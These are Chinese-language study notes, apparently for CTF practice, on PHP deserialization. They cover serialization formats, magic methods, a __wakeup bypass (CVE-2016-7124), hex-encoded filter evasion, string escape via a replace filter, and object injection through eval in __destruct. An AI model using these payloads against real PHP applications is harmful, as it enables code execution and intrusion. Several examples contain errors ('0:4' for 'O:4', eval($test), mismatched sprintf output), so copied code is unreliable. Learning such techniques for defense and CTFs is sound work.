# PHP反序列化

#### 0x01前置知识&简介

**1.1序列化和反序列化函数**

serialize()将对象格式化成有序的字符串

unserialize()将字符串还原成原来的对象

序列化的目的是方便数据的传输和储存，同时不丢失其类型和数据结构

example

```php
<?php
$user=array('xiao','shi','zi');
$user=serialize($user);
echo($user.PHP_EOL);   //PHP_EOL PHP换行符
print_r(unserialize($user));
```

```php
//output

a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
Array
(
    [0] => xiao
    [1] => shi
    [2] => zi
)
```

```
a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
a:array数组 3说明有三个属性
i：数字类型int，0是数组下标
s:字符串String，后面的4是字符串xiao的长度

以此类推
```

又如

类的序列化，序列化后的内容只有成员变量没有成员函数

```php
<?php
class test{
    public $a;
    public $b;
    function __construct(){$this->a = "xiaoshizi";$this->b="laoshizi";}
    function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
?>
```

```
//output

O:4:"test":2:{s:1:"a";s:9:"xiaoshizi";s:1:"b";s:8:"laoshizi";}
O对象 4长度 test 2成员变量的数量
```

而如果变量前是protected，则会在变量名前加上`\x00*\x00`,private则会在变量名前加上`\x00类名\x00`

```
//example

<?php
class test{
    protected  $a;
    private $b;
    function __construct(){$this->a = "xiaoshizi";$this->b="laoshizi";}
    function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
echo urlencode(serialize($a));
?>
```

输出则会导致不可见字符\x00的丢失

```
O:4:"test":2:{s:4:" * a";s:9:"xiaoshizi";s:7:" test b";s:8:"laoshizi";}
//s:1:"a"变成s:4:" * a"
//不可见字符占一位
```

**1.2魔术方法（不需要手动调用，而是当一些事件/条件啊触发时自动调用的类方法）**

在对PHP序列化进行利用时，经常需要通过序列化中的魔术方法，检查方法里有无敏感操作来进行利用。

```
__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
```

**__sleep()**

执行serialize() 函数之前会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。

**__wakeup()**

执行unserialize() 之前会检查是否存在一个 wakeup() 方法。如果存在，则会先调用 wakeup 方法，预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。

**__toString()**

__toString() 方法用于指定一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。

```php
<?php 
class Caiji{
    public function __construct($ID, $sex, $age){
        $this->ID = $ID;
        $this->sex = $sex;
        $this->age = $age;
        $this->info = sprintf("ID: %s, age: %d, sex: %s", $this->ID, $this->sex, $this->age);
    }

    public function __toString(){
        return $this->info;            //指定对象me被当作字符串输出时返回$this->info
    }
}

$me = new Caiji('twosmi1e', 20, 'male');
echo '__toString:' . $me . '<br>';        //me被当作字符串输出时返回$this->info
?>
```

```
//output

__toString:ID:twosmi1e,age:20,sex:male
```

#### 2.PHP反序列化Trciks

**2.1php7.1+反序列化对类属性不敏感**

变量名前是protected，序列化结果会在变量名前加上\x00*\x00

但是在特定版本php7.1+则对类属性不敏感，比如下面的例子即使没有\x00*\x00也依然会输出`abc

```
<?php
class test{
    protected $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function  __destruct(){
        echo $this->a;
    }
}

//创建类class（属性不敏感 和上面的类一样）对象创建调用__construct()
unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');    
//程序结束摧毁对象 调用__destruct()
因此输出abc
```

**2.2绕过__wakeup （CVE-2016-7124）

```
VERSION
 PHP5 < 5.6.25
 PHP7 < 7.0.10
```

exploitation

序列化字符串中表示对象属性个数的值大于真实的属性和个数时会跳过__wakeup的执行

```php
//example
<?php
class test{
    public $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function __wakeup(){
        $this->a='666';
    }
    public function  __destruct(){
        echo $this->a;
    }
}
```

```php
//对象属性个数等于真实属性个数
unserialize('0:4:"test":1:{s:1:"a";s:3:"abc";}')
输出结果666

//对象属性个大于于真实属性个数
unserialize('0:4:"test":2:{s:1:"a";s:3:"abc";}')
输出结果abc，成功绕过__wakeup()
```

**2.3 16进制绕过字符的过滤**

```
O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
可以写成
O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
表示字符类型的s大写时，会被当成16进制解析。
```

```php
//example

<?php
class test{
    public $username;
    public function __construct(){
        $this->username = 'admin';
    }
    public function  __destruct(){
        echo 666;
    }
}
function check($data){
    if(stristr($data, 'username')!==False){
        echo("你绕不过！！".PHP_EOL);
    }
    else{
        return $data;
    }
}
// 未作处理前
$a = 'O:4:"test":1:{s:8:"username";s:5:"admin";}';
$a = check($a);
unserialize($a); 
//将S大写 u转换成16进制
// 做处理后 \75是u的16进制  
$a = 'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}';
$a = check($a);
unserialize($a);
```

```
//output

你绕不过！！
666
```

**2.4PHP反序列化字符逃逸**

本地php代码如下

```
<?php
function change($str){
    return str_replace("x","xx",$str);
}
$name = $_GET['name'];
$age = "I am 11";
$arr = array($name,$age);
echo "反序列化字符串：";
var_dump(serialize($arr));
echo "<br/>";
echo "过滤后:";
$old = change(serialize($arr));
$new = unserialize($old);
var_dump($new);
echo "<br/>此时，age=$new[1]";
```

传入maox，会导致反序列化失败，因为s是4但是多了个x内容变成maoxx

此处可以利用而实现字符串逃逸

传入name=maoxxxxxxxxxxxxxxxxxxxx";i:1;s:6:"woaini";}

";i:1;s:6:"woaini";}总共20个字符，一共是20个x变成了40个，多出来的刚好取代了";i:1;s:6:"woaini";}这20个字符，而"闭合了40个x的字符串，而";i:1;s:6:"woaini";}就变成了数组第二个元素，因此可以成功反序列化，输出woaini。而原来的";i:1;s:7:"I am 11";}"`被舍弃，但是不影响反序列化过程。

**2.5对象注入**

攻击者可以提交特定的序列化的字符串给含有对象注入漏洞的unserialize函数，最终导致在该范围内的任意PHP对象注入。

条件

- unserialize函数参数可控
-  代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。

```
<?php
class A{
    var $test = "y4mao";
    function __destruct(){
        eval($test);
    }
}
$a = 'O:1:"A":1:{s:4:"test";s:10:"phpinfo();";}';
unserialize($a);
//脚本运行结束后会调用__destruct函数，覆盖变量test并且执行phpinfo();
```

#### 3.POP链的构造和利用

POP链：从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。

反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。







 [(6条消息) [CTF]PHP反序列化总结_ctf php反序列化_Y4tacker的博客-CSDN博客.url](..\..\..\(6条消息) [CTF]PHP反序列化总结_ctf php反序列化_Y4tacker的博客-CSDN博客.url)  [PHP反序列化由浅入深 - 先知社区.url](..\..\..\PHP反序列化由浅入深 - 先知社区.url)  [php反序列化完整总结 - 先知社区.url](..\..\..\php反序列化完整总结 - 先知社区.url)  [3. php反序列化从入门到放弃(入门篇) - bmjoker - 博客园.url](..\..\..\3. php反序列化从入门到放弃(入门篇) - bmjoker - 博客园.url)  [4. php反序列化从入门到放弃(放弃篇) - bmjoker - 博客园.url](..\..\..\4. php反序列化从入门到放弃(放弃篇) - bmjoker - 博客园.url) 